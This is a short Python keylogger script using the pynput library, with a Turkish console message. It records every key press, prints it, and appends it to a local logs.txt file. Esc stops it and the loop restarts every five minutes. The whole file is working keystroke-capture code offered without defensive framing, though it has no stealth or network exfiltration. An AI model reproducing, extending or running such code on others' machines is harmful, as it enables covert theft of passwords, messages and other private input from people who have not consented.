import time
from pynput.keyboard import Listener, Key

count = 0
keys = []


def keyLogger():

    while True:

        def onPress(key):
            global keys, count
            keys.append(key)
            count = count + 1
            print(str(key) + "tuşuna basıldı")

            if count >= 1:
                writeFile(keys)
                keys = []
                count = 0

        def writeFile(keys):
            with open("logs.txt", "a") as file:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        file.write("\n")
                    elif k.find("Key"):
                        file.write(str(k))

        def onRelease(key):
            if key == Key.esc:
                return False

        with Listener(on_press=onPress, on_release=onRelease) as listener:
            listener.join()

        time.sleep(60*5)
